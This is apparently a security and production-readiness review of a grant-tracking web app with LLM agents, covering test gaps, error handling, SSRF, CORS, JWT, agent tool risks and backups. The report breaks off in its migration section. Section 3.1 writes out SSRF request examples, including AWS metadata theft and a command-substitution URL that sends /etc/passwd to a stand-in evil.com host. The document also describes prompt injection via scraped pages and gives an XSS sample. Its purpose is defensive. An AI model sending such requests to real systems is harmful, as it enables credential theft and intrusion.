# Option 4: Harden the App -- Testing, Error Handling, Security, and Production Readiness

**Grant Watcher on N3TX v0.10 | Research Date: 2026-03-04**

---

## Executive Summary

Grant Watcher is a functional prototype with a solid architectural foundation -- schema-driven
models, Level 3 actor routing, ABAC authorization, and LLM agent execution all work. But
there is a meaningful gap between "works in demo" and "safe to deploy." This document maps
every gap, quantifies the risk, and prioritizes the work.

> **Key Insight:** The single highest-risk item is **SSRF in WebTools.scrape()** --
> it fetches arbitrary user-supplied URLs with zero validation, and an LLM agent can trigger
> it autonomously. This is a 1-line exploit that could scan your internal network. Fix it
> before anything else.

The application has **~14 test cases** across 5 test files covering basic CRUD happy paths.
Rough estimate: **30-40% of code paths are tested.** Auth edge cases, error recovery,
concurrent access, agent failure modes, and security boundaries are all untested. Production
deployment with the current test coverage would be flying blind.

The good news: N3TX's architecture makes hardening efficient. The schema-driven pattern
means many fixes apply once and propagate everywhere -- add rate limiting to `NetworkAPI`
and every endpoint gets it. Fix error handling in `handler_crud()` and every model benefits.
The framework's consistency is a security multiplier.

---

## Table of Contents

1. [Test Coverage Gap Analysis](#-1-test-coverage-gap-analysis)
2. [Error Handling Hardening](#-2-error-handling-hardening)
3. [Security Hardening](#-3-security-hardening)
4. [Production Operations](#-4-production-operations)
5. [Data Integrity & Validation](#-5-data-integrity--validation)
6. [Priority Matrix & ROI](#-6-priority-matrix--roi)
7. [Trade-offs](#-7-trade-offs)
8. [Sources](#-sources)

---

## :mag: 1. Test Coverage Gap Analysis

### 1.1 Current Test Inventory

Reading every test file in `example_grants/tests/`, here is what exists today:

| Test File | Tests | What It Covers | What It Misses |
|-----------|-------|----------------|----------------|
| `test_grants_crud.py` | 5 | List (public), list metadata, create (auth), create (unauth), get by ID, get 404, update as admin | Delete, update as owner, update as non-owner, pagination, field validation |
| `test_sources_crud.py` | 3 | List, create, get by ID | Delete, update, unauthenticated access, pagination |
| `test_agent_crud.py` | 6 | List, get, tool hrefs, create via API, update, add tool via join | Delete, tool removal, unauthenticated access |
| `test_agent_run.py` | 4 | Run no tools, run with tool call, sources_list call, resolve tool hrefs | Error paths, timeout, bad LLM response, cost limits |
| `test_schema_endpoints.py` | 4 | Grant/Source/Agent/WebTools schema structure | Access rules in schema, $defs, widget metadata |

**Total: ~22 test cases.** All are happy-path or basic validation.

### 1.2 E2E Test Inventory

| Test File | Tests | Status |
|-----------|-------|--------|
| `e2e/test_create_validation.py` | 3 | Requires running server (Playwright) |
| `e2e/test_navigation.py` | 4 | Requires running server (Playwright) |

These are solid UI tests but cannot run in CI without a server fixture.

### 1.3 Untested Code Paths -- The Gap Map

```
UNTESTED PATHS (by risk category)
=================================

CRITICAL (security boundaries)
  [x] Expired JWT token -> should return 401
  [x] Malformed JWT token -> should return 401
  [x] Wrong role accessing admin-only endpoint -> 403
  [x] Non-owner trying to delete a grant -> 403
  [x] Non-owner trying to update a grant -> 403 (OWNER rule)
  [x] WebTools.scrape() with internal URL (SSRF)
  [x] Agent run with prompt injection payload
  [x] SQL injection via custom method parameters

HIGH (data integrity)
  [x] Create grant with invalid URL format
  [x] Create grant with amount_min > amount_max
  [x] Update grant with empty title (min_length=1)
  [x] Duplicate grant detection (same title+agency)
  [x] FK hydration with deleted parent reference
  [x] Concurrent creates (race condition on unique constraints)

MEDIUM (operational correctness)
  [x] Pagination: offset beyond total count
  [x] Pagination: limit=0 or limit=101 (boundary)
  [x] Agent run with network timeout (LLM unreachable)
  [x] Agent run hitting max_iterations constraint
  [x] Agent tool call returning error TX
  [x] Delete source referenced by an agent's tools
  [x] Schema endpoint with scaffold parameter

LOW (polish)
  [x] Widget metadata in schema responses
  [x] $defs structure for nested models
  [x] Error message format consistency
  [x] Login with wrong password
  [x] Login with non-existent email
  [x] Register with duplicate email
```

### 1.4 Test Architecture Recommendations

```
tests/
  conftest.py               <-- session-scoped DB + seed (exists)
  test_grants_crud.py       <-- expand CRUD coverage
  test_sources_crud.py      <-- expand CRUD coverage
  test_agent_crud.py        <-- expand CRUD coverage
  test_agent_run.py          <-- add error paths
  test_schema_endpoints.py   <-- add access/widget checks
  test_auth_enforcement.py   <-- NEW: auth boundary tests
  test_error_handling.py     <-- NEW: error path coverage
  test_pagination.py         <-- NEW: pagination edge cases
  test_data_validation.py    <-- NEW: input validation
  security/
    test_ssrf.py             <-- NEW: WebTools SSRF tests
    test_injection.py        <-- NEW: XSS/SQLi tests
    test_agent_security.py   <-- NEW: prompt injection tests
  e2e/
    conftest.py              <-- NEW: server fixture for CI
    test_create_validation.py
    test_navigation.py
```

### 1.5 Coverage Targets

| Category | Current | MVP Target | Production Target |
|----------|---------|------------|-------------------|
| Auth enforcement | 1 test (unauth create) | 10 tests | 20+ tests |
| CRUD happy paths | 14 tests | 25 tests | 40+ tests |
| Error paths | 1 test (404) | 15 tests | 30+ tests |
| Agent execution | 4 tests | 10 tests | 20+ tests |
| Security boundaries | 0 tests | 8 tests | 15+ tests |
| E2E flows | 7 tests | 10 tests | 20+ tests |
| **Total** | **~22** | **~78** | **~145+** |

> **Key Insight:** The highest-value tests to add are **auth enforcement tests**.
> Every endpoint has ABAC rules that are currently untested. One test per rule per
> endpoint adds ~15 tests and catches the most dangerous class of bugs -- unauthorized access.

### 1.6 Critical Missing Test: Auth Enforcement

The Grant model declares:
```python
__access__ = {
    'read': ANYONE,
    'create': AUTHENTICATED,
    'update': AUTHENTICATED | ROLE('admin'),
    'delete': OWNER | ROLE('admin'),
}
```

Only `create` (unauthenticated) is tested. Here is what needs coverage:

```python
# test_auth_enforcement.py — sketch

class TestGrantDeleteAuth:
    def test_delete_as_owner(self, client, alice_token, seed_data):
        """Owner should be able to delete their own grant."""
        grant = seed_data["grants"][0]  # Alice owns this
        resp = client.delete(f"/grants/{grant.id}",
                             headers=auth_header(alice_token))
        assert resp.status_code == 200

    def test_delete_as_non_owner(self, client, bob_token, seed_data):
        """Non-owner non-admin should be denied."""
        grant = seed_data["grants"][0]  # Alice owns this
        resp = client.delete(f"/grants/{grant.id}",
                             headers=auth_header(bob_token))
        assert resp.status_code == 403

    def test_delete_as_admin(self, client, admin_token, seed_data):
        """Admin should be able to delete any grant."""
        # create a fresh grant to delete
        resp = client.post("/grants", json={...},
                           headers=auth_header(admin_token))
        gid = resp.json()["id"]
        resp = client.delete(f"/grants/{gid}",
                             headers=auth_header(admin_token))
        assert resp.status_code == 200

    def test_delete_unauthenticated(self, client, seed_data):
        """Unauthenticated request should be denied."""
        grant = seed_data["grants"][0]
        resp = client.delete(f"/grants/{grant.id}")
        assert resp.status_code in (401, 403)
```

---

## :warning: 2. Error Handling Hardening

### 2.1 Current Error Handling Landscape

| Layer | Mechanism | Gaps |
|-------|-----------|------|
| Routes (`routes_fastapi.py`) | `try/except` around CRUD, `HTTPException` with `config.DEBUG` toggle | Stack traces leak in debug mode; generic 400 for all creation errors |
| NetworkAPI (`network_api.py`) | TX error -> `HTTPException` via `_response_or_raise()` | Fixed 30s timeout, no retry, no timeout customization |
| Auth interceptor | Returns error TX (401/403) | No rate-limit on failed auth attempts |
| Actor handler (`actor_model.py`) | `_exception_to_tx_error()` wraps exceptions | Async method errors silently logged, not propagated to caller |
| Agent mixin (`mixin.py`) | `try/finally` for adapter cleanup | No error handling around `ai_agent.run()` -- exceptions bubble raw |
| Base user (`base_user.py`) | `HTTPException` for login/register | `cls.list()` scans ALL users for login/register -- O(n), no index |

### 2.2 Agent Execution: The Biggest Error Gap

The `agent_run()` method in `mixin.py` has **zero error handling** around the LLM call:

```python
# Line 129 of mixin.py -- no try/except
result = await ai_agent.call(task, deps=deps, usage_limits=usage_limits)
```

Failure modes that will crash or hang:

| Failure Mode | What Happens Now | What Should Happen |
|---|---|---|
| LLM API key invalid | `pydantic_ai.ModelHTTPError` bubbles to FastAPI as 500 | Return structured error with "LLM configuration error" |
| LLM API timeout | Hangs until adapter's 30s timeout | Configurable timeout with clean error message |
| LLM returns malformed response | `pydantic_ai` internal error, 500 | Retry once, then return "LLM response error" |
| Tool call fails (target actor not found) | `ModelRetry` raised (correct!) | Good -- but no limit on retries means infinite loop potential |
| Usage limit exceeded | `UsageLimitExceeded` exception, 500 | Return structured result with partial output |
| Network error mid-conversation | Raw exception | Return partial results with error flag |

**Recommended fix pattern:**

```python
try:
    result = await ai_agent.call(task, deps=deps, usage_limits=usage_limits)
except UsageLimitExceeded:
    return {'answer': None, 'error': 'Usage limit exceeded',
            'usage': {...}, 'messages': ...}
except ModelHTTPError as e:
    return {'answer': None, 'error': f'LLM API error: {e.status_code}',
            'usage': {}, 'messages': 0}
except Exception as e:
    logger.exception("Agent run failed for %s", agent_addr)
    return {'answer': None, 'error': str(e),
            'usage': {}, 'messages': 0}
finally:
    root._children.pop(adapter_addr, None)
```

### 2.3 Actor System Error Propagation

```
[Client] --HTTP--> [NetworkAPI] --TX--> [Matrix] --TX--> [ActorModel]
                                                              |
                                                         exception!
                                                              |
                                                     tx.error(str(e))
                                                              |
                                                         [Matrix]
                                                              |
                                                     reply TX to NetworkAPI
                                                              |
                                              _response_or_raise() -> HTTPException
                                                              |
                                                         [Client]
```

This flow works for synchronous errors. The gaps are:

- **Async fire-and-forget failures**: `_publish_lifecycle()` uses `asyncio.create_task()` --
  if the task fails, the exception is silently swallowed. In Python 3.11+, this logs a
  warning but does not crash. Still, lost lifecycle events mean lost audit trail.

- **Dead letters**: If a TX targets a non-existent actor address, `Matrix.send()` logs
  an error but does not return an error TX. The sender's `request()` Future times out
  after 30 seconds with no useful error message.

- **Interceptor exceptions**: If an interceptor raises (rather than returning error TX),
  the exception propagates up the call stack unpredictably. Interceptors should be wrapped
  in try/except at the `_run_interceptors` level.

### 2.4 Storage Layer Error Handling

The SQLite storage layer has minimal error handling:

```python
# sqlite_storage.py line 596-600
try:
    cursor.execute(update_sql, values)
    conn.commit()
except sqlite3.Error as e:
    raise RuntimeError(f"Database update failed: {e}")
```

Missing error handling:

| Scenario | Current Behavior | Risk |
|----------|-----------------|------|
| Database locked (concurrent write) | `busy_timeout=5000` then `sqlite3.OperationalError` | 5s hang then crash |
| Disk full | `sqlite3.OperationalError` | Data loss (partial write) |
| Connection pool exhausted | Creates new connection (unbounded) | Memory leak under load |
| Corrupted database file | Unpredictable errors | No recovery path |
| FK constraint violation | Generic `sqlite3.IntegrityError` | Unhelpful error message |

### 2.5 Error Handling Priority

| Fix | Effort | Risk Reduced | Priority |
|-----|--------|-------------|----------|
| Wrap `agent_run()` in try/except | 1 hour | HIGH -- prevents 500s from agent runs | **P0** |
| Add dead letter handling to Matrix | 2 hours | MEDIUM -- prevents silent failures | P1 |
| Wrap interceptors in try/except | 1 hour | MEDIUM -- prevents unpredictable crashes | P1 |
| Add connection pool bounds + monitoring | 2 hours | LOW -- only matters under heavy load | P2 |
| Structured error types for storage | 4 hours | LOW -- improves error messages | P2 |

---

## :lock: 3. Security Hardening

### 3.1 SSRF: The Critical Vulnerability

**File:** `example_grants/models/web_tools.py`, lines 16-21

```python
@expose_route('/scrape', methods=['POST'], access=AUTHENTICATED)
async def scrape(self, url: str) -> dict:
    """Fetch a URL and return its HTML content."""
    import httpx
    async with httpx.AsyncClient(follow_redirects=True, timeout=30) as client:
        resp = await client.get(url)
    return {'url': url, 'status': resp.status_code, 'html': resp.text[:50000]}
```

This endpoint accepts **any URL** from any authenticated user (or from an LLM agent
via tool calls). An attacker can:

1. **Scan the internal network**: `POST /web_tools/1/scrape {"url": "http://169.254.169.254/latest/meta-data/"}` -- reads AWS instance metadata including IAM credentials.

2. **Access internal services**: `POST /web_tools/1/scrape {"url": "http://localhost:6379/"}` -- probe Redis, databases, admin panels.

3. **Exfiltrate via DNS**: `POST /web_tools/1/scrape {"url": "http://$(cat /etc/passwd | base64).evil.com/"}` -- leak data through DNS resolution.

4. **Port scan**: Iterate through `http://internal-host:1-65535/` -- timing differences reveal open ports.

5. **Agent-amplified SSRF**: An LLM agent processing a malicious website could be tricked via prompt injection to call `web_tools_scrape` with an internal URL -- the attacker never needs direct API access.

This is compounded by **CVE-2026-25580** and **CVE-2026-25904** in pydantic-ai itself, both SSRF-related vulnerabilities ([CVE-2026-25580](https://www.cvedetails.com/cve/CVE-2026-25580/), [CVE-2026-25904](https://www.sentinelone.com/vulnerability-database/cve-2026-25904/)).

**Mitigation requirements (per [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)):**

```python
import ipaddress
import socket
from urllib.parse import urlparse

# Blocked IP ranges
_BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),       # Loopback
    ipaddress.ip_network('10.0.0.0/8'),         # Private
    ipaddress.ip_network('172.16.0.0/12'),      # Private
    ipaddress.ip_network('192.168.0.0/16'),     # Private
    ipaddress.ip_network('169.254.0.0/16'),     # Link-local / AWS metadata
    ipaddress.ip_network('::1/128'),            # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),           # IPv6 private
]

def _validate_url(url: str) -> str:
    """Validate URL is safe to fetch. Raises ValueError if blocked."""
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        raise ValueError(f"Blocked protocol: {parsed.scheme}")

    hostname = parsed.hostname
    if not hostname:
        raise ValueError("No hostname in URL")

    # Resolve DNS and check IP
    try:
        addrs = socket.getaddrinfo(hostname, None)
    except socket.gaierror:
        raise ValueError(f"DNS resolution failed: {hostname}")

    for family, _, _, _, sockaddr in addrs:
        ip = ipaddress.ip_address(sockaddr[0])
        for blocked in _BLOCKED_RANGES:
            if ip in blocked:
                raise ValueError(f"Blocked IP range: {ip}")

    return url
```

Additionally, consider [Drawbridge](https://github.com/nicois/drawbridge), an httpx-compatible transport layer that enforces SSRF policy at the transport level, handling URL validation, redirect re-checking, and IP range blocking.

### 3.2 Security Posture Assessment

| Category | Current State | Risk Level | Effort to Fix |
|----------|--------------|------------|---------------|
| **SSRF** | No URL validation in WebTools | **CRITICAL** | 2-4 hours |
| **JWT Secret** | Default `ntx-dev-secret-change-in-production` | **CRITICAL** | 10 minutes (env var) |
| **CORS** | `allow_origins=["*"]`, `allow_credentials=True` | **HIGH** | 30 minutes |
| **Rate Limiting** | None | **HIGH** | 2-4 hours |
| **Input Sanitization** | Pydantic type validation only | MEDIUM | 4-8 hours |
| **API Docs Exposure** | `/docs` and `/redoc` publicly accessible | MEDIUM | 30 minutes |
| **Debug Mode** | Enabled by default (`DEBUG=true`) | MEDIUM | 10 minutes |
| **Token Lifecycle** | No refresh tokens, no revocation | MEDIUM | 8-16 hours |
| **Agent Prompt Injection** | No input filtering | MEDIUM | 4-8 hours |
| **Dependency Security** | No audit process | LOW | 1-2 hours |
| **Password Policy** | No minimum length/complexity | LOW | 1 hour |

### 3.3 CORS Misconfiguration

**File:** `src/n3tx/core/api/backend.py`, lines 59-76

```python
if cors_origins is None:
    cors_origins = ["*"]
# ...
self.app.add_middleware(
    CORSMiddleware,
    allow_origins=cors_origins,      # ["*"] by default
    allow_credentials=True,           # Sends cookies cross-origin
    allow_methods=["*"],
    allow_headers=["*"],
)
```

`allow_origins=["*"]` combined with `allow_credentials=True` is a **security anti-pattern**. Per the [Fetch specification](https://fetch.spec.whatwg.org/), browsers should reject this combination, but older browsers or misconfigured proxies may not enforce it. The practical risk: any website can make authenticated requests to the Grant Watcher API on behalf of a logged-in user.

**Fix:** In production, set explicit allowed origins:

```python
cors_origins = os.environ.get("CORS_ORIGINS", "http://localhost:5000").split(",")
```

### 3.4 JWT Security

The current JWT implementation (`src/n3tx/core/authorize/auth.py`) has several gaps:

| Issue | Current | Recommended |
|-------|---------|-------------|
| Default secret | `ntx-dev-secret-change-in-production` | **Require** non-default secret at startup |
| Algorithm | HS256 (symmetric) | HS256 is fine for single-server; RS256 for multi-server |
| Expiry | 24 hours | 15-60 minutes for access tokens |
| Refresh tokens | None | Implement rotation per [Auth0 best practices](https://auth0.com/docs/secure/tokens/token-best-practices) |
| Token revocation | None | DB-backed revocation list or short-lived tokens |
| Token storage | `x-access-token` header | HttpOnly cookies for browser clients |

The `INSECURE_SECRETS` check in `auth.py` is good -- it warns at startup. But warnings are
easily ignored. A stronger pattern:

```python
def configure(*, jwt_secret: str = None, **kwargs):
    if _jwt_secret.lower() in INSECURE_SECRETS:
        if os.environ.get('N3TX_ENV', 'dev') == 'production':
            raise RuntimeError(
                "FATAL: Using default JWT secret in production. "
                "Set N3TX_JWT_SECRET environment variable."
            )
```

### 3.5 Login Endpoint: Brute Force Risk

**File:** `src/n3tx/core/models/base_user.py`, lines 76-108

The login endpoint has two problems:

1. **No rate limiting**: An attacker can try unlimited password combinations.
2. **Full table scan**: `cls.list()` loads ALL users into memory to find one by email.

The full table scan is both a performance and security issue -- if the users table grows to
10K+ records, login becomes a DoS vector (each attempt does a full scan).

**Recommended fix:** Add a `get_by_email()` method using a SQL WHERE clause, and add
rate limiting at the route level.

### 3.6 Agent Security: The OWASP Agentic Top 10

The Grant Watcher agent architecture maps directly to the [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/):

| OWASP Risk | Grant Watcher Exposure | Severity |
|---|---|---|
| **ASI01: Agent Goal Hijack** | Agent scrapes arbitrary web pages. A malicious page could contain prompt injection in its HTML that redirects the agent to exfiltrate data or create misleading grants. | **HIGH** |
| **ASI02: Tool Misuse** | Agent has `grants_create`, `grants_delete`, `web_tools_scrape`. No tool-level permission scoping -- the agent can delete any grant or scrape any URL. | **HIGH** |
| **ASI03: Identity & Privilege Abuse** | Agent runs as the authenticated user who triggers `/agents/1/run`. If that user is admin, the agent has admin privileges for all tool calls. | **MEDIUM** |
| **ASI10: Rogue Agents** | No behavioral monitoring or kill switch. A stuck agent could loop indefinitely (max_iterations defaults to unlimited). | **MEDIUM** |

**Meta's Agents Rule of Two** ([ai.meta.com](https://ai.meta.com/blog/practical-ai-agent-security/)) provides a practical framework: an agent session should have at most two of three properties:

- **(A)** Processing untrusted inputs (scraping web pages)
- **(B)** Accessing sensitive data (reading grants/sources)
- **(C)** Changing state (creating/deleting grants)

The Grant Scanner agent has **all three**. Per the Rule of Two, this agent should not
operate autonomously without human-in-the-loop approval for state changes.

**Concrete mitigations:**

```
AGENT SECURITY LAYERS
=====================

1. Tool Permission Scoping
   [Agent] --tool_call--> [Permission Check] --if allowed--> [Tool]
                                |
                           [deny if action not in allowlist]

2. Input Sanitization Layer
   [Scraped HTML] --strip scripts/iframes--> [Text-only content] --to LLM-->

3. Output Validation
   [LLM output] --validate against schema--> [Only if valid] --execute-->

4. Human-in-the-loop for State Changes
   [Agent wants to DELETE] --pause--> [Approval Queue] --human approves--> [Execute]
```

### 3.7 Input Validation Beyond Pydantic

Pydantic validates **types** but not **content**. Examples of content-level risks:

| Field | Pydantic Validates | Not Validated |
|-------|-------------------|---------------|
| `Grant.title` | `min_length=1, max_length=500` | Contains `<script>` tags (XSS) |
| `Grant.description` | type: str | Contains HTML/JS injection |
| `Grant.url` | `AnyHttpUrl` format | Points to internal network (SSRF in display) |
| `Source.url` | `AnyHttpUrl` format | Points to malicious domain |
| `Grant.status` | type: str | Accepts any value, not limited to `discovered|reviewed|applied|expired` |

The `status` field is particularly interesting -- it accepts any string, so an agent
could set `status="<script>alert('xss')</script>"` and the frontend would render it
unsanitized.

**Fix for status:** Use a Literal type:

```python
from typing import Literal
status: Literal['discovered', 'reviewed', 'applied', 'expired'] = 'discovered'
```

**Fix for XSS:** Since N3TX renders content via Web Components with `textContent`
assignment (not `innerHTML`), XSS risk in the standard rendering path is low. However,
any custom rendering or markdown widgets that use `innerHTML` need sanitization. The
`MarkdownWidget` uses `marked.min.js` which should have XSS prevention enabled.

### 3.8 SQL Injection Assessment

The storage layer uses **parameterized queries** throughout (`?` placeholders with parameter
binding), which prevents classical SQL injection. The `_validate_identifier()` function
validates table and column names against `^[a-zA-Z_][a-zA-Z0-9_]*$`.

However, the `sql_filter` mechanism passes WHERE clauses from the authorization system
directly into queries. These clauses are generated by trusted code (the `AccessRule` classes),
not user input, so the risk is low. But if a custom `AccessRule` is implemented incorrectly,
it could introduce injection. The architecture is sound here.

### 3.9 Dependency Audit

| Dependency | Version Risk | Known CVEs | Action |
|-----------|-------------|------------|--------|
| `pydantic-ai` | Active development, breaking changes | CVE-2026-25580 (SSRF via message history), CVE-2026-25904 (MCP SSRF) | Update to >= 1.56.0; avoid `mcp-run-python` |
| `httpx` | Stable | None recent | Monitor |
| `beautifulsoup4` | Stable | None recent | Low risk |
| `pyjwt` | Stable | Historical algorithm confusion attacks | Enforce `algorithms=["HS256"]` (done correctly) |
| `bcrypt` | Stable | None recent | Low risk |
| `uvicorn` | Stable | None recent | Low risk |
| `sqlite3` (stdlib) | Bundled with Python | N/A | Low risk |

**Recommendation:** Add `pip-audit` to CI pipeline:
```bash
pip install pip-audit
pip-audit --strict --desc  # fails on any known vulnerability
```

---

## :gear: 4. Production Operations

### 4.1 SQLite in Production: Honest Assessment

SQLite is used as the production database. This is increasingly acceptable for
single-server deployments -- companies like [Expensify, Fly.io, and Tailscale use
SQLite in production](https://dev.to/pockit_tools/the-sqlite-renaissance-why-the-worlds-most-deployed-database-is-taking-over-production-in-2026-3jcc). The key constraints:

| Characteristic | SQLite with WAL | PostgreSQL | Verdict |
|---------------|----------------|------------|---------|
| Concurrent reads | Unlimited | Unlimited | Tie |
| Concurrent writes | 1 writer (others queue) | Many writers | **SQLite loses** if write-heavy |
| Write throughput | 10K-50K writes/sec (NVMe) | 50K+ writes/sec | Good enough for Grant Watcher |
| Max practical DB size | ~1 TB (tested) | Unlimited | Good enough |
| Horizontal scaling | Single server only | Multi-server | **SQLite loses** |
| Backups | File copy (or `VACUUM INTO`) | pg_dump, streaming replication | SQLite is simpler |
| Connection pooling | N3TX has 4-connection pool | pgBouncer / built-in | Adequate |
| Full-text search | FTS5 extension | Built-in | Both capable |

**Verdict for Grant Watcher:** SQLite is fine for MVP and early production. The
write load (grant discovery, agent runs) is low. Switch to PostgreSQL when you need:
(a) horizontal scaling, (b) concurrent agent runs causing write contention, or
(c) complex queries beyond simple CRUD.

The current `SQLiteStorage` already enables WAL mode and sets `busy_timeout=5000`,
which is correct. Missing production settings:

```python
# Add to SQLiteStorage.__init__:
init_conn.execute("PRAGMA journal_mode=WAL")        # Already done
init_conn.execute("PRAGMA busy_timeout=5000")        # Already done
init_conn.execute("PRAGMA synchronous=NORMAL")       # Missing: 2x write speedup
init_conn.execute("PRAGMA cache_size=-64000")         # Missing: 64MB page cache
init_conn.execute("PRAGMA foreign_keys=ON")           # Missing: enforce FK integrity
init_conn.execute("PRAGMA temp_store=MEMORY")         # Missing: temp tables in RAM
```

`synchronous=NORMAL` is safe with WAL mode -- it trades negligible durability risk
(power failure during commit could lose the last transaction) for 2x write performance.
This is the [recommended production setting](https://phiresky.github.io/blog/2020/sqlite-performance-tuning/).

### 4.2 Logging: Current State vs Requirements

**Current state:** Standard Python `logging` with `basicConfig` in `main.py`. No structured
formatting, no correlation IDs, no request tracing.

**What production needs:**

```
Current:
  INFO n3tx.api: Creating Grant record
  INFO n3tx.api: Record created with ID: 42

Production:
  {"timestamp": "2026-03-04T10:15:30Z", "level": "INFO",
   "service": "grant-watcher", "request_id": "abc-123",
   "user_id": 1, "action": "create", "model": "Grant",
   "duration_ms": 45, "status": "success", "entity_id": 42}
```

**Implementation path using [structlog](https://www.structlog.org/):**

```python
import structlog

structlog.configure(
    processors=[
        structlog.contextvars.merge_contextvars,
        structlog.processors.add_log_level,
        structlog.processors.TimeStamper(fmt="iso", utc=True),
        structlog.processors.JSONRenderer()
    ],
    logger_factory=structlog.PrintLoggerFactory(),
)
```

Use the [asgi-correlation-id](https://pypi.org/project/asgi-correlation-id/) middleware
to attach a `request_id` to every request, propagated through all log entries.

**Estimated effort:** 4-6 hours for full structured logging migration.

### 4.3 Health Checks & Monitoring

The application has no health check endpoint. Production requires at minimum:

```python
@router.get("/health")
async def health():
    """Basic health check -- verifies DB connectivity."""
    try:
        # Quick query to verify DB is accessible
        with storage._connection() as conn:
            conn.execute("SELECT 1")
        return {"status": "healthy", "db": "connected"}
    except Exception as e:
        return JSONResponse(
            status_code=503,
            content={"status": "unhealthy", "db": str(e)}
        )
```

For metrics, the recommended stack is:

```
[Grant Watcher] --metrics--> [Prometheus] --query--> [Grafana]
                      |
         starlette-prometheus middleware
```

Key metrics to track:

| Metric | Why |
|--------|-----|
| Request latency (p50, p95, p99) | Detect performance degradation |
| Error rate by endpoint | Catch regressions |
| Agent run duration | LLM cost monitoring |
| Agent tool call count per run | Detect runaway agents |
| DB connection pool utilization | Capacity planning |
| JWT validation failures | Detect brute force attacks |

### 4.4 Configuration Management

Current config uses environment variables with hardcoded defaults:

```python
# config.py
JWT_SECRET = os.environ.get("N3TX_JWT_SECRET",
    "ntx-dev-secret-change-in-production")  # Dangerous default
HOST = os.environ.get("N3TX_HOST", "0.0.0.0")
DEBUG = os.environ.get("N3TX_DEBUG", "true")  # Debug ON by default
```

**Production checklist:**

- [ ] `N3TX_JWT_SECRET` set to a random 256-bit key
- [ ] `N3TX_DEBUG` set to `false`
- [ ] `N3TX_HOST` set to `127.0.0.1` (behind reverse proxy)
- [ ] `N3TX_API_URL` set to the actual public URL
- [ ] `CORS_ORIGINS` set to actual frontend domain
- [ ] LLM API keys in environment variables, not in code or DB

### 4.5 Deployment Architecture

```
RECOMMENDED PRODUCTION STACK
=============================

                    Internet
                       |
                   [Cloudflare / WAF]
                       |
                   [Nginx / Caddy]       <-- TLS termination, static files
                       |                     rate limiting at edge
                   [Gunicorn]            <-- Process manager
                       |
            +----------+----------+
            |          |          |
       [Uvicorn]  [Uvicorn]  [Uvicorn]   <-- 2-4 workers
            |          |          |
       [Grant Watcher FastAPI app]        <-- Shared SQLite via WAL
                       |
                  [grants.db]             <-- Single file, backed up hourly
                       |
                  [S3 / Object Store]     <-- Backup destination
```

**Containerization (Dockerfile sketch):**

```dockerfile
FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .

# Production settings
ENV N3TX_DEBUG=false
ENV N3TX_HOST=0.0.0.0
ENV N3TX_PORT=5000

# Run with Gunicorn + Uvicorn workers
CMD ["gunicorn", "main:app", \
     "-w", "4", \
     "-k", "uvicorn.workers.UvicornWorker", \
     "-b", "0.0.0.0:5000", \
     "--access-logfile", "-", \
     "--error-logfile", "-"]
```

### 4.6 Backup Strategy

SQLite backups are simple but must be done correctly:

```bash
# Option 1: sqlite3 .backup command (safe during writes in WAL mode)
sqlite3 grants.db ".backup '/backups/grants_$(date +%Y%m%d_%H%M%S).db'"

# Option 2: VACUUM INTO (creates optimized copy)
sqlite3 grants.db "VACUUM INTO '/backups/grants_$(date +%Y%m%d_%H%M%S).db'"

# Cron: every hour
0 * * * * /usr/local/bin/backup-grants.sh
```

**Do NOT** use `cp` while the application is running -- it may copy a partially-written
WAL file. Use SQLite's built-in backup API or `VACUUM INTO`.

---

## :shield: 5. Data Integrity & Validation

### 5.1 Duplicate Grant Detection

The current system has no duplicate detection. If the agent scrapes the same grant source
twice, it will create duplicate records. This is a data quality problem, not a crash,
but it degrades trust in the system.

**Detection approaches:**

| Approach | Accuracy | Complexity | Recommended |
|----------|----------|------------|-------------|
| Unique index on `(title, agency)` | High for exact matches | Low | **Yes (MVP)** |
| URL uniqueness | High | Low | **Yes (MVP)** |
| Fuzzy matching (Levenshtein) | Handles variations | Medium | Phase 2 |
| LLM-based dedup | Handles semantic dupes | High | Phase 3 |

**MVP implementation:**

```sql
CREATE UNIQUE INDEX IF NOT EXISTS idx_grants_url ON grants(url);
```

This requires a migration and error handling for the `IntegrityError` on duplicate insert.

### 5.2 Orphan Records

When a parent record is deleted, child records may be orphaned:

| Parent | Child | FK Column | Current Behavior |
|--------|-------|-----------|-----------------|
| Grant (deleted) | -- | -- | No children defined |
| AgentActor (deleted) | AgentActorAgentTool (join) | `agentactor_id` | **Orphaned records** |
| Source (deleted) | -- | -- | No children defined |

SQLite supports `ON DELETE CASCADE` but N3TX's auto-migration does not add it.
Currently, deleting an agent leaves orphaned tool records in the join table.

**Fix:** Enable foreign key enforcement and add CASCADE:

```python
# In SQLiteStorage.__init__:
init_conn.execute("PRAGMA foreign_keys=ON")

# In migration:
# ALTER TABLE agentactoragenttool
#   ADD CONSTRAINT fk_agent
#   FOREIGN KEY (agentactor_id) REFERENCES agents(id) ON DELETE CASCADE;
```

Note: SQLite does not support `ALTER TABLE ... ADD CONSTRAINT`. The table must be
recreated. The migration system can handle this.

### 5.3 Agent-Created Data Quality

When an LLM agent creates grants, the data quality depends on:

1. **The source HTML quality** -- garbage in, garbage out
2. **The LLM's extraction accuracy** -- may hallucinate amounts, dates, URLs
3. **Schema validation** -- Pydantic catches type errors but not semantic errors

**Risks with agent-created grants:**

| Risk | Example | Impact |
|------|---------|--------|
| Hallucinated URL | Agent invents `https://nsf.gov/grant-12345` | User follows dead link |
| Wrong deadline | Agent reads "2025" as "2026" | Missed application |
| Inflated amounts | Agent misparses "$100,000" as "$100,000,000" | Misleading data |
| Missing fields | Agent creates grant without description | Incomplete record |

**Mitigation pattern:**

```python
# Add to Grant model
status: Literal['discovered', 'reviewed', 'applied', 'expired'] = 'discovered'

# All agent-created grants start as 'discovered'
# Human review changes to 'reviewed'
# This is already the design intent but not enforced
```

The `status` field workflow is the right pattern -- it just needs the `Literal` type
enforcement and a UI filter to highlight unreviewed grants.

### 5.4 Migration Safety

The current migration system (`sqlite_migration.py`) handles:

- **Auto-migration:** Adds new columns when models change (handled by `migrate_table()`)
- **Manual migrations:** Rails-style numbered migration files in `migrations/`

**What's missing:**

- **Rollback:** No mechanism to undo a migration
